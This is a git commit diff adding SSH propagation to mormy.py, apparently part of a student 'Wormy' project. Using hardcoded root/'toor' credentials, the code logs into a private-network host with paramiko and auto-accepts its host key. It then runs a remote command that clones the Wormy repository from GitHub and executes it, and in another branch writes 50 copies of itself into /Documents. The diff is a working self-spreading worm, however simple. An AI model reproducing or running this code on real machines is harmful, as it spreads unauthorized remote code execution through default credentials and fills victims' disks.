707a6e90e16b38baf53555965567cfd640a0ece9
scott <tyung@dons.usfca.edu>
2019-01-30 22:09:16 -0800

    remote ssh

--- mormy.py
+++ mormy.py
@@ -1,10 +1,29 @@
 #!/usr/bin/env python
 
 import os
+import sys
+import paramiko
 from shutil import copyfile
+if __name__ == "__main__":
+    password = 'toor'
+    username = 'root'
+    host = '10.42.0.243'
+    port = 22
+    if sys.argv[1] == '1':
+        print ('lets not corrupt our cpu')
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host,username = username, password = password)
+            stdin, stdout, stderr = client.exec_command("cd Documents\ngit clone https://github.com/Timothyyung/Wormy\ncd Wormy\npython3 mormy.py")
+            print (stdout.read())
+        
+        finally:
+            client.close()
+            
 
-
-for i in range (0,50):
-    dst = './wormy' + str(i) + '.py'
-    copyfile('./mormy.py',dst)    
+    else:
+        for i in range (0,50):
+            dst = '/Documents/wormy' + str(i) + '.py'
+            copyfile('./mormy.py',dst)    
     
